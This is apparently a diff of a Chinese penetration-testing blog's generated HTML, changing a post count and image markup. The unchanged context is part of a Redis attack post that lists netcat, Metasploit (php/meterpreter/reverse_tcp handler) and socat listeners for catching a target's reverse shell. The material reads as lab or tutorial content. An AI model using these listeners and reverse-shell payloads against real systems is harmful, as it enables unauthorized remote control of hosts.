@@ -162,7 +162,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">159</span>
+          <span class="site-state-item-count">161</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -279,9 +279,9 @@ AOF: Append Only File</p>
 <h3><span id="jian-ting">监听</span><a href="#jian-ting" class="header-anchor">#</a></h3>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#netcat</span></span><br><span class="line">nc -lvp 7777</span><br><span class="line"></span><br><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment">#socat(kali)</span></span><br><span class="line">socat TCP-LISTEN:7777 -</span><br></pre></td></tr></table></figure>
 <h3><span id="ba-ji-jian-li-fan-dan-lian-jie">靶机建立反弹连接</span><a href="#ba-ji-jian-li-fan-dan-lian-jie" class="header-anchor">#</a></h3>
-<p><img data-src="/img/msb/17389164721036.jpg" alt></p>
-<p><img data-src="/img/msb/17389177981544.png" alt></p>
-<p><img data-src="/img/msb/17389167707220.png" alt></p>
+<figure><img data-src="/img/msb/17389164721036.jpg" alt></figure>
+<figure><img data-src="/img/msb/17389177981544.png" alt></figure>
+<figure><img data-src="/img/msb/17389167707220.png" alt></figure>
 <p>注意防火墙</p>
 <h3><span id="zong-jie">总结</span><a href="#zong-jie" class="header-anchor">#</a></h3>
 <p>流程：</p>
